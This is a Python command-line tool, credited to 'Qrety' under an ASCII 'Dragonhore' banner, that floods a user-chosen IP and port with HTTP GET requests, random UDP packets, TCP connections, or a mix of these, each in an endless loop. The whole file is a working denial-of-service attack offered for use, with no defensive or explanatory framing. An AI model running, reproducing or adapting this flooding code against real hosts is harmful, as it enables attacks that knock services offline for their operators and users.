    import socket
    import random
    from random import randint as r
    def httpflood(target,port):
        sayi = 0
        while 1:
            fake_ip = str(r(1,254)) + "." + str(r(1,254)) + "." + str(r(1,254)) + "." + str(r(1,254))
            sayi+=1
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            print("Attack Http :" , sayi)
    def udpflood(target1,port1):
        sayi = 0
        while 1:
            sayi +=1
            data = random._urandom(1024)
            sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
            sock.sendto(data,(target1,port1))
            print("Attack Udp :" , sayi)
    def tcpflood(target2,port2):
        sayi = 0
        while 1:
            sayi+=1
            data = random._urandom(1024)
            sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sk.connect((target2,port2))
            sk.send(data)
            sk.close()
            print("Attack Tcp :", sayi)
    def tcpfudp(target3,port3):
        sayi = 0
        while 1:
            sayi+=1
            sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            data = random._urandom(1024)
            sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
            sock.sendto(data,(target3,port3))
            sk.connect((target3,port3))
            sk.send(data)
            sk.close()
            print("Attack Udp & Tcp : ", sayi)
    banner = """
    ________                                   ______                  
    ___  __ \____________ _______ ________________  /_________________ 
    __  / / /_  ___/  __ `/_  __ `/  __ \_  __ \_  /_  __ \_  ___/  _ \
    _  /_/ /_  /   / /_/ /_  /_/ // /_/ /  / / /  / / /_/ /  /   /  __/
    /_____/ /_/    \__,_/ _\__, / \____//_/ /_//_/  \____//_/    \___/ 
                          /____/                                      

    *-*-*-*-*-*-*-*-*-*-*-*
    * 1 - Http Attack     *
    * 2 - Udp Attack      *
    * 3 - Tcp Attack      *
    * 4 - Tcp & Udp Attack*
    *-*-*-*-*-*-*-*-*-*-*-*

    -*- Coded by Qrety -*-

    """
    print(banner)
    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    secim = int(input(">>"))
    host = input("Ip : ")
    port = int(input("Port:"))

    if secim == 1:
        httpflood(host,port)
    if secim == 2:
        udpflood(host,port)
    if secim == 3:
        tcpflood(host,port)
    if secim == 4:
        tcpfudp(host,port)
    else:
        print("What ?")





